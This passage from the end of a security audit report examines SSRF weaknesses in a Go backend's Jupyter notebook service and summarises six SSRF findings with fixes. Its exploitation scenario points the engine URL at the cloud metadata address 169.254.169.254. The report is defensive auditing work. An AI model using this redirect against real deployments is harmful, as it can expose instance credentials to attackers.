- **Endpoint:** `POST /api/develop/notebooks/execute`
- **Router:** `/Users/pampa/code/addp/develop/backend/internal/api/router.go` line 171
- **Authentication:** Required (JWT)

**Code Snippet:**
```go
type JupyterService struct {
    cfg              *config.Config
    jupyterEngineURL string  // USER-CONTROLLABLE via config
    httpClient       *http.Client
}

func NewJupyterService(cfg *config.Config) *JupyterService {
    jupyterEngineURL := cfg.JupyterEngineURL  // FROM CONFIG
    if jupyterEngineURL == "" {
        jupyterEngineURL = "http://jupyter-engine:8097" // Default
    }
    return &JupyterService{
        jupyterEngineURL: jupyterEngineURL,
        httpClient: &http.Client{
            Timeout: 10 * time.Minute,  // 10 MINUTE TIMEOUT
        },
    }
}

func (s *JupyterService) ExecuteNotebook(ctx context.Context, req *models.ExecuteNotebookRequest) (*models.NotebookExecutionResponse, error) {
    // Build API URL - CONSTRUCTED FROM CONFIG
    apiURL := fmt.Sprintf("%s/api/execute", s.jupyterEngineURL)

    reqData, _ := json.Marshal(req)

    // Create request - SSRF SINK
    httpReq, err := http.NewRequestWithContext(ctx, "POST", apiURL, bytes.NewBuffer(reqData))
    httpReq.Header.Set("Content-Type", "application/json")

    resp, err := s.httpClient.Do(httpReq)
    return resp
}
```

**User-Controllable Parameters:**
1. **JupyterEngineURL** - From configuration file or environment variable
2. Typically points to internal service, but if config is compromised, can redirect

**Exploitation Scenario:**
```bash
# If attacker can modify configuration:
JUPYTER_ENGINE_URL=http://169.254.169.254/latest

# Then notebook execution becomes:
# POST http://169.254.169.254/latest/api/execute
# With 10-minute timeout allowing slow operations
```

**Impact:** **MEDIUM**
- Configuration-based SSRF (requires config modification)
- 10-minute timeout allows very long-running requests
- Can send arbitrary JSON payloads to target

**Recommended Fix:**
- Validate `JupyterEngineURL` format and whitelist
- Use internal Docker DNS (jupyter-engine:8097)
- Add network policy to restrict Jupyter engine access

---

### SSRF Attack Surface Summary

| Location | Severity | Authentication | User Control | Exploitability |
|----------|----------|----------------|--------------|----------------|
| Service Proxy | CRITICAL | Public | Full | High - direct API |
| Metadata Refresh | HIGH | Required | Full | High - direct API |
| Health Check | MEDIUM | Required | Full | Medium - rate limited |
| Orchestrator | HIGH | Required | Engine config | Medium - requires engine registration |
| Copilot Ollama | MEDIUM | Required | Config file | Low - requires config access |
| Jupyter Service | MEDIUM | Required | Config file | Low - requires config access |

**Total Critical/High SSRF Vulnerabilities:** 3

**Immediate Action Required:**
1. Implement URL validation and IP range blocking for service proxy (CRITICAL)
2. Add URL whitelist for metadata refresh endpoints (HIGH)
3. Restrict engine registration to administrators (HIGH)
4. Block internal IP ranges (RFC1918, link-local, loopback) across all HTTP clients
5. Implement network segmentation to limit blast radius

---

**END OF CODE ANALYSIS REPORT**
